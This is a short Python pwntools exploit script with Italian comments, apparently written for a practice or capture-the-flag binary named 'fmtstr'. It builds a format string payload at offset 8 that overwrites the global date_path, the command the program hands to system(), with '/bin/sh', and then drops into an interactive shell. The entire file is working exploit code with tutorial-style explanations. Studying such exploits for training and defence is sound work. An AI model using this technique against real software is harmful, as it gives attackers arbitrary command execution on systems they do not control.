from pwn import *

def main():
    e = ELF('../Machines/fmtstr')
    p = process(e.path)
    context.update(arch='amd64', os='linux') #È fondamentale l'inserimento del contesto, ovvero l'architettura e il sistema operativo dell'elf
    #Se non si ha la sicurezza del contesto basta riferirsi a quello dell'eseguibile con: 
    # context.binary = e

    print(e.symbols['date_path']) #Si ottiene l'indirizzo della variabile dove è salvato il comando che viene eseguito nella funzione system()
    p.recvline()

    #Creazione ed invio del payload che sfrutta la vulnerabilità di "format string" tramite pwntools, per cambiare il contenuto della stringa date_path
    p.sendline(fmtstr_payload(8, {e.symbols['date_path'] : b'/bin/sh\x00'}))

    #Shell ottenuta
    p.interactive()

if __name__ == '__main__':
    main()